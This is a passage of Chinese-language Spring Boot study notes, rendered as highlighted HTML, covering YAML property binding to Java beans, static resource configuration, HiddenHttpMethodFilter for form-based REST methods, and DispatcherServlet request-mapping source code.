class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.bean;<br><br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.ToString;<br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ToString</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String userName;<br>    <span class="hljs-keyword">private</span> Boolean boss;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> Pet pet;<br>    <span class="hljs-keyword">private</span> String[] interests;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; animal;<br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; score;<br>    <span class="hljs-keyword">private</span> Set&lt;Double&gt; salarys;<br>    <span class="hljs-keyword">private</span> Map&lt;String, List&lt;Pet&gt;&gt; allPets;<br>&#125;<br></code></pre></td></tr></table></figure><p>再创建一个Pet类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.bean;<br><br><br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.ToString;<br><br><span class="hljs-meta">@ToString</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Pet</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Double weight;<br>&#125;<br></code></pre></td></tr></table></figure><p>在resources文件夹下创建application.yml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">userName:</span> <span class="hljs-string">zhangsan</span><br>  <span class="hljs-attr">boss:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-number">2019</span><span class="hljs-string">/12/12</span> <span class="hljs-number">20</span><span class="hljs-string">:12:33</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">18</span><br>  <span class="hljs-attr">pet:</span> <br>    <span class="hljs-attr">name:</span> <span class="hljs-string">tomcat</span><br>    <span class="hljs-attr">weight:</span> <span class="hljs-number">23.4</span><br>  <span class="hljs-attr">interests:</span> [<span class="hljs-string">篮球</span>,<span class="hljs-string">游泳</span>]<br>  <span class="hljs-attr">animal:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">jerry</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">mario</span><br>  <span class="hljs-attr">score:</span><br>    <span class="hljs-attr">english:</span> <br>      <span class="hljs-attr">first:</span> <span class="hljs-number">30</span><br>      <span class="hljs-attr">second:</span> <span class="hljs-number">40</span><br>      <span class="hljs-attr">third:</span> <span class="hljs-number">50</span><br>    <span class="hljs-attr">math:</span> [<span class="hljs-number">131</span>,<span class="hljs-number">140</span>,<span class="hljs-number">148</span>]<br>    <span class="hljs-attr">chinese:</span> &#123;<span class="hljs-attr">first:</span> <span class="hljs-number">128</span>,<span class="hljs-attr">second:</span> <span class="hljs-number">136</span>&#125;<br>  <span class="hljs-attr">salarys:</span> [<span class="hljs-number">3999</span>,<span class="hljs-number">4999.98</span>,<span class="hljs-number">5999.99</span>]<br>  <span class="hljs-attr">allPets:</span><br>    <span class="hljs-attr">sick:</span><br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">tom</span>&#125;<br>      <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">jerry</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;<br>    <span class="hljs-attr">health:</span> [&#123;<span class="hljs-attr">name:</span> <span class="hljs-string">mario</span>,<span class="hljs-attr">weight:</span> <span class="hljs-number">47</span>&#125;]<br></code></pre></td></tr></table></figure><p>创建一个控制器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.controller;<br><br><span class="hljs-keyword">import</span> com.example.demo.bean.Person;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    Person person;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/person&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">person</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>单引号会将\n做完字符串输出，双引号会将\n作为换行</p><h3 id="自定义类绑定的配置提示"><a href="#自定义类绑定的配置提示" class="headerlink" title="自定义类绑定的配置提示"></a>自定义类绑定的配置提示</h3><p>pom.xml导入依赖即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意userName它会提示成user-name，这两个写法都可以</p><p>打包的时候要把这个包排除掉，在pom.xml配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--打包插件--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Web场景"><a href="#Web场景" class="headerlink" title="Web场景"></a>Web场景</h2><h3 id="静态资源管理规则与定制化"><a href="#静态资源管理规则与定制化" class="headerlink" title="静态资源管理规则与定制化"></a>静态资源管理规则与定制化</h3><h4 id="静态资源目录"><a href="#静态资源目录" class="headerlink" title="静态资源目录"></a>静态资源目录</h4><p>只要静态资源放在resources下的这些目录都可以访问</p><ul><li>public</li><li>static</li><li>resources（和父目录同名）</li><li>META-INF&#x2F;resources</li></ul><p>原理：先找controller处理请求，不能处理的请求交给静态资源处理器</p><h4 id="静态资源访问前缀"><a href="#静态资源访问前缀" class="headerlink" title="静态资源访问前缀"></a>静态资源访问前缀</h4><p>默认无前缀</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">static-path-pattern:</span> <span class="hljs-string">/res/**</span><br></code></pre></td></tr></table></figure><p>当前项目+<code>static-path-pattern</code>+静态资源名称&#x3D;静态文件夹下找</p><h3 id="欢迎页支持（略）"><a href="#欢迎页支持（略）" class="headerlink" title="欢迎页支持（略）"></a>欢迎页支持（略）</h3><p>第一种：静态资源路径下index.html</p><p>第二种：controller处理&#x2F;index</p><h3 id="自定义网站标签页图标"><a href="#自定义网站标签页图标" class="headerlink" title="自定义网站标签页图标"></a>自定义网站标签页图标</h3><p>把favicon.ico文件放在静态资源文件夹，禁用浏览器缓存即可看见</p><h3 id="静态资源原理"><a href="#静态资源原理" class="headerlink" title="静态资源原理"></a>静态资源原理</h3><p>原理研究步骤</p><ol><li>SpringBoot启动默认加载<code>xxxAutoConfiguration</code>类（自动配置类）</li><li>进入xxx功能的自动配置类<code>xxxAutoConfiguration</code></li><li>看这个自动配置类里面有什么内置类</li><li>看其涉及的配置文件相关属性</li></ol><p>HandlerMapping（处理器映射）保存了每一个Handler能处理哪些请求，老板分配任务，springmvc里面学过</p><h2 id="请求处理"><a href="#请求处理" class="headerlink" title="请求处理"></a>请求处理</h2><h3 id="Rest请求映射"><a href="#Rest请求映射" class="headerlink" title="Rest请求映射"></a>Rest请求映射</h3><p>核心Filter：<code>HiddenHttpMethodFilter</code></p><p>根据<code>HiddenHttpMethodFilter.java</code>源代码，需要delete方法提交需要添加一个隐藏参数。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE提交&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看一下<code>HiddenHttpMethodFilter.java</code>源代码，里面有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServletRequestWrapper</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String method;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpMethodRequestWrapper</span><span class="hljs-params">(HttpServletRequest request, String method)</span> &#123;<br><span class="hljs-built_in">super</span>(request);<br><span class="hljs-built_in">this</span>.method = method;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>HttpServletRequestWrapper本质是servlet，其中的HttpMethodRequestWrapper方法修改了method变量</p><p>再看另外一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">requestToUse</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-comment">//获得的方法是POST</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span>.equals(request.getMethod()) &amp;&amp; request.getAttribute(WebUtils.ERROR_EXCEPTION_ATTRIBUTE) == <span class="hljs-literal">null</span>) &#123;<br>           <span class="hljs-comment">//获得methodParam这个参数</span><br><span class="hljs-type">String</span> <span class="hljs-variable">paramValue</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-built_in">this</span>.methodParam);<br><span class="hljs-keyword">if</span> (StringUtils.hasLength(paramValue)) &#123;<br>               <span class="hljs-comment">//转大写</span><br><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> paramValue.toUpperCase(Locale.ENGLISH);<br><span class="hljs-keyword">if</span> (ALLOWED_METHODS.contains(method)) &#123;<br>                   <span class="hljs-comment">//修改了请求方式，包装模式</span><br>requestToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span>(request, method);<br>&#125;<br>&#125;<br>&#125;<br><br>filterChain.doFilter(requestToUse, response);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据该类的这两行源代码可知</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_METHOD_PARAM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;_method&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">methodParam</span> <span class="hljs-operator">=</span> DEFAULT_METHOD_PARAM;<br></code></pre></td></tr></table></figure><p><code>methodParam</code>即为<code>&quot;_method&quot;</code>，所以我们要传这个参数才能DELETE什么的。Filter放行的是<code>HttpMethodRequestWrapper</code>而不是<code>HttpServletRequest</code>，以后调用的<code>getMethod</code>是调用<code>HttpMethodRequestWrapper</code>的。</p><p>直接DELETE发包还是不用参数的，这里指的是html表单的方式</p><h3 id="请求映射原理"><a href="#请求映射原理" class="headerlink" title="请求映射原理"></a>请求映射原理</h3><p>SpringMVC功能分析都要从<code>doDispatch()</code>方法分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">try</span> &#123;<br>processedRequest = checkMultipart(request);<br>multipartRequestParsed = (processedRequest != request);<br><br><span class="hljs-comment">// Determine handler for the current request.</span><br>mappedHandler = getHandler(processedRequest);<span class="hljs-comment">//获得哪个控制器来处理当前请求</span><br><span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>noHandlerFound(processedRequest, response);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// Determine handler adapter for the current request.</span><br><span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br><span class="hljs-comment">// Process last-modified header, if supported by the handler.</span><br><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isGet</span> <span class="hljs-operator">=</span> HttpMethod.GET.matches(method);<br><span class="hljs-keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;<br><span class="hljs-type">long</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">// Actually invoke the handler.</span><br>mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>applyDefaultViewName(processedRequest, mv);<br>mappedHandler.applyPostHandle(processedRequest, response, mv);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>dispatchException = ex;<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br><span class="hljs-comment">// As of 4.3, we&#x27;re processing Errors thrown from handler methods as well,</span><br><span class="hljs-comment">// making them available for @ExceptionHandler methods and other scenarios.</span><br>dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>&#125;<br>processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>&#125;<br><span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>triggerAfterCompletion(processedRequest, response, mappedHandler,<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-comment">// Instead of postHandle and afterCompletion</span><br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Clean up any resources used by a multipart request.</span><br><span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>cleanupMultipart(processedRequest);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面这行可以获得处理器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">mappedHandler = getHandler(processedRequest);<br></code></pre></td></tr></table></figure><p>进去看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br><span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> handler;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面这个可以获得请求类，这个<code>HandlerExecutionChain</code>在springmvc提到过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br></code></pre></td></tr></table></figure><p><code>WebMvcConfigurationSupport.java</code>中自动配置了<code>RequestMappingHandlerMapping</code>，体现了springboot中有注解标记的处理器不用配置处理器的原因</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> RequestMappingHandlerMapping <span class="hljs-title function_">requestMappingHandlerMapping</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-meta">@Qualifier(&quot;mvcContentNegotiationManager&quot;)</span> ContentNegotiationManager contentNegotiationManager,</span><br><span class="hljs-params"><span class="hljs-meta">@Qualifier(&quot;mvcConversionService&quot;)</span> FormattingConversionService conversionService,</span><br><span class="hljs-params"><span class="hljs-meta">@Qualifier(&quot;mvcResourceUrlProvider&quot;)</span> ResourceUrlProvider resourceUrlProvider)</span> &#123;......<br></code></pre></td></tr></table></figure><h3 id="常用注解使用"><a href="#常用注解使用" class="headerlink" title="常用注解使用"></a>常用注解使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/cat/&#123;id&#125;/owner/&#123;username&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getCar</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@PathVariable(&quot;username&quot;)</span> String name,</span><br><span class="hljs-params">                                      <span class="hljs-meta">@PathVariable</span> Map&lt;String, String&gt; 